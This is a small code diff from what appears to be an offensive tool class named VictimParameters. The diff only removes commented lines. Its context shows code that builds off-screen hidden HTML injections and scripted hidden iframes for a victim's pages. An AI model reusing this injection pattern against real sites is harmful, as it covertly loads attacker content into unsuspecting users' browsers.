@@ -138,8 +138,6 @@ class VictimParameters(object):
         f += '''<div style="position:absolute;top:-9999px;left:-9999px;visibility:collapse;">\n'''
         f += injects
         f += '</div>'
-        ### Shouldn't need to create injection
-        #injection = f
         return f
 
 
@@ -160,6 +158,4 @@ class VictimParameters(object):
         iframes += '''iframe1.location = s;\n'''
         iframes += ''' }\n}\ntry{\nsetTimeout(setIframeSrc''' + str(i) + ''', 10);\n} catch (err){\n}\n'''
         iframes += '''</script>\n'''
-        ### Shouldn't need to create injection
-        #injection = self.create_iframe_injection(iframes)
         return self.create_iframe_injection(iframes)
